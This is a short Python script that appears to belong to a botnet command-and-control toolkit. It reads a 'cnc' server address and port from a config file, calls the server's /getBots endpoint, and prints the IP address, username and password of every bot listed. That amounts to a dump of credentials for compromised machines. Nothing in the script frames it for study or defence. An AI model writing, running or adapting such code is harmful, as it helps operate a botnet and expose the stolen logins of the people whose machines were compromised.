import json
import requests 

cnc=""
port=""
with open('../.config') as f:
	for line in f:
		if("cnc" in line):
			cnc=line.split("=")[1].split("\n")[0]
		if("port" in line):
			port=line.split("=")[1].split("\n")[0]			
server = "http://"+cnc+":"+port

r=requests.get(url=server+"/getBots")
data = r.json()
for i in data.keys():
	print(data[i]["ip"]+","+data[i]["username"]+","+data[i]["password"])